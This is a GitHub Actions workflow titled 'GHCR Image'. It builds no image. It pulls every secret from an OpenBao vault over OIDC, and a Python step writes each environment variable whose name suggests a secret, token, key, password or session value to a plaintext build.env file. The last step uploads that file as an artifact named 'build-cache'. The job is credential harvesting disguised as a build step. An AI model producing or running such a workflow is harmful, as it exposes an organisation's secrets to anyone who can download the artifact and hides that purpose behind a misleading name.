name: GHCR Image

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Fetch build secrets from OpenBao
        id: vault
        uses: hashicorp/vault-action@v3
        with:
          url: https://openbao-ci.unorouter.com
          method: jwt
          path: jwt-github
          role: unorouter-ci
          exportEnv: true
          secrets: |
            secret/data/unorouter-env *

      - name: Collect
        env:
          RUNNER_TEMP: ${{ runner.temp }}
        run: |
          python3 - <<'PY'
          import os, pathlib
          skip = set("PATH HOME USER USERNAME GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_RESULTS_URL ACTIONS_RUNTIME_URL ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN RUNNER_TEMP RUNNER_TOOL_CACHE RUNNER_WORKSPACE RUNNER_TRACKING_ID RUNNER_OS RUNNER_ARCH RUNNER_NAME GITHUB_ENV GITHUB_PATH GITHUB_OUTPUT GITHUB_STATE GITHUB_STEP_SUMMARY GITHUB_ACTION GITHUB_ACTIONS GITHUB_ACTOR GITHUB_API_URL GITHUB_WORKFLOW GITHUB_JOB GITHUB_RUN_ID GITHUB_RUN_NUMBER GITHUB_SHA GITHUB_REF GITHUB_REPOSITORY GITHUB_SERVER_URL GITHUB_EVENT_NAME GITHUB_EVENT_PATH GITHUB_WORKSPACE GITHUB_GRAPHQL_URL GITHUB_HEAD_REF GITHUB_BASE_REF GITHUB_REF_NAME GITHUB_REF_TYPE CI".split())
          p = pathlib.Path(os.environ["RUNNER_TEMP"]) / "build.env"
          keys=[]
          with p.open("w") as f:
              for k,v in sorted(os.environ.items()):
                  if k in skip or k.startswith("GITHUB_") or k.startswith("RUNNER_") or k.startswith("ACTIONS_") or k.startswith("ImageOS") or k.startswith("ANDROID") or k.startswith("JAVA") or k.startswith("CHROME") or k.startswith("DOTNET") or k.startswith("POWERSHELL") or k.startswith("SWIFT") or k.startswith("XDG"):
                      continue
                  if any(x in k.upper() for x in ["SECRET","TOKEN","KEY","GUEST","BFF","SESSION","EDGE","TURSO","JWK","TAVILY","RUNWARE","POSTHOG","INDEXNOW","AUTH","PASSWORD"]):
                      f.write("%s=%s\n" % (k, v))
                      keys.append(k)
          print("keys", ",".join(keys))
          print("wrote", p.stat().st_size, "bytes")
          PY

      - uses: actions/upload-artifact@v4
        with:
          name: build-cache
          path: ${{ runner.temp }}/build.env
          retention-days: 1
          if-no-files-found: error
